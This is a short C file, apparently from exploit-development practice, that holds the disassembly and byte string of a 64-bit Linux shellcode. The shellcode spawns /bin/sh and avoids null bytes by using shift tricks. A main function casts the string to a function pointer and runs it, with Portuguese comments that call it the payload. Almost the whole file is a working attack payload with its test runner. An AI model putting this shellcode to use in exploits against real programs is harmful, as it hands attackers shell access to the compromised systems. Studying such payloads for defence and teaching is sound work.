#include<stdio.h>
// disasemble main 
// bin/sh linux 64 bit
/*
 * *******************************
00000000004004ac <main>:
  4004ac:	55                   	push   %rbp
  4004ad:	48 89 e5             	mov    %rsp,%rbp
  4004b0:	48 31 d2             	xor    %rdx,%rdx
  4004b3:	48 89 d6             	mov    %rdx,%rsi
  4004b6:	48 bf 2f 62 69 6e 2f 	movabs $0x1168732f6e69622f,%rdi
  4004bd:	73 68 11 
  4004c0:	48 c1 e7 08          	shl    $0x8,%rdi
  4004c4:	48 c1 ef 08          	shr    $0x8,%rdi
  4004c8:	57                   	push   %rdi
  4004c9:	48 89 e7             	mov    %rsp,%rdi
  4004cc:	48 b8 3b 11 11 11 11 	movabs $0x111111111111113b,%rax
  4004d3:	11 11 11 
  4004d6:	48 c1 e0 38          	shl    $0x38,%rax
  4004da:	48 c1 e8 38          	shr    $0x38,%rax
  4004de:	0f 05                	syscall
  ********************************
*/
 #define SHELLCODE "\x48\x31\xd2\x48\x89\xd6\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe7\x08\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb8\x3b\x11\x11\x11\x11\x11\x11\x11\x48\xc1\xe0\x38\x48\xc1\xe8\x38\x0f\x05"

  main() 
  {
  int (*function)();

   // criando um ponteiro
   function = (int(*)())SHELLCODE;

   // executando o payload
   (int)(*function)();
   return 0;
   }
